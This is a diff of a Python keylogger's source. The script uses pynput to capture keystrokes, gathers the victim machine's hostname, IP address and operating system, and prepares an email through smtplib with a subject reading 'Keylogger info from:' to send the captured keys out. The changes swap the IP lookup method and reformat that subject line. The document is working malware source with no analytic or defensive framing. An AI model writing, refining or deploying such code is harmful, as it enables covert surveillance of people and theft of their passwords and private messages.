@@ -1,7 +1,6 @@
-import public_ip
 from pynput import keyboard
 from email.mime.text import MIMEText
-from socket import gethostname
+from socket import gethostbyname, gethostname
 from platform import system
 import time
 import smtplib
@@ -54,7 +53,7 @@ key_names = {
 }
 
 hostname = gethostname()
-ip = public_ip.get() 
+ip = gethostbyname(hostname) 
 os = system()
 
 log_data = ''
@@ -66,7 +65,7 @@ def send_email_with_keys(keys):
     password = "appPasswordHere"
     
     message = MIMEText(keys)
-    subject = f"Keylogger info from: {os} {hostname} {ip}"
+    subject = "Keylogger info from: "+ os +" "+ hostname +" ("+ip+")"
     content = keys
     message['subject'] = subject
     message['from'] = sender_email
